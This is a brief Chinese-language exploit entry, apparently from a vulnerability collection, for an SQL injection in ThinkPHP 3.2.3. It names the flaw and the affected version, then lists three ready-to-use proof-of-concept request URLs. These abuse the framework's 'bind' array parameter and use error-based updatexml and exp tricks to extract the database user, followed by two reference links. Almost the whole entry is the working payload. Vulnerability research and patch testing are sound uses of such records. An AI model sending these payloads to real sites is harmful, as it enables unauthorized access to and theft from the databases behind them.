## 漏洞类型

- SQLI

## 影响范围

Thinkphp 3.2.3

## POC|EXP

```txt
index.php/home/user?id[]=bind&id[]=0%27&money[]=1123&user=liao

index.php/home/user?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))

http://localhost/tp32/?name[0]=bind&name[1]=0 and exp(~(select * from(select user())a))
```

## 参考链接


> https://www.anquanke.com/post/id/104847
>
> https://mp.weixin.qq.com/s/4xXS7usHMFNgDTEHcHBcBA?